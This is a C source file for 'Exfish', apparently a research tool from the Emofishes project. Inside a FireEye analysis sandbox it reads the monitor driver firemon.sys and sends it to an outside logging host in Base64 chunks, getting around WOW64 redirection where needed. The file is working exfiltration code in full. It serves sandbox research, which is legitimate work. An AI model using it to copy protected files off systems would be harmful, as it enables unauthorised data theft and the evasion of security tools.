/**
 * Copyright (C) 2016 Duarte Silva
 *
 * This file is part of Emofishes.
 *
 * Infish is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Infish is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with Infish. If not, see <http://www.gnu.org/licenses/>.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <memory.h>
#include <windows.h>

#include "console.h"
#include "logging.h"
#include "wow64.h"
#include "base64.h"

/**
 * Send a file over the logging socket. The file contents will be Base64 in
 * chunks of 246 bytes.
 * @param filename
 */
void send_file(const char *filename)
{
	printf("[*] Sending file %s ... ", filename);

	FILE *file = fopen(filename, "rb");

	if (file == NULL) {
		print_failed();
		return;
	}

	uint8_t buffer[256];
	
	// No need to use base64_encode_len and dynamic memory allocation since
	// the read chunks will have a maximum size of 256 bytes.
	char encoded[345];
	size_t read;
	
	do {
		read = fread(buffer, 1, 256, file);
		if (read > 0) {
			base64_encode(encoded, buffer, read);
			send_loga(encoded);
		}

	} while(read > 0);

	fclose(file);
	
	print_ok();
}

int main()
{
	uint16_t original_colors = 0;

	original_colors = init_cmd_attributes();
	print_header(L"Exfish", L"Extrovert fish", L"FireEye monitor driver exfiltration", 10);

	wprintf(L"[*] Initializing socket ... ");
	if (init_socket() != 1) {
		print_failed();
	} else {
		print_ok();

		PVOID old = NULL;

		if (is_wow64() == 1 && disable_wow64_fs_redirection(&old) == 1) {
			send_file("C:\\WINDOWS\\system32\\drivers\\firemon.sys");
			revert_wow64_fs_redirection(old);
		} else {
			send_file("C:\\WINDOWS\\system32\\drivers\\firemon.sys");
		}

		wprintf(L"\n[*] Cleanup socket ...\n");
		clean_socket();
	}

	wprintf(L"\n\n");
	wprintf(L"[-] Feel free to RE me, check log file for more information.");

	getchar();

	restore_cmd_attributes(original_colors);

	return 0;
}

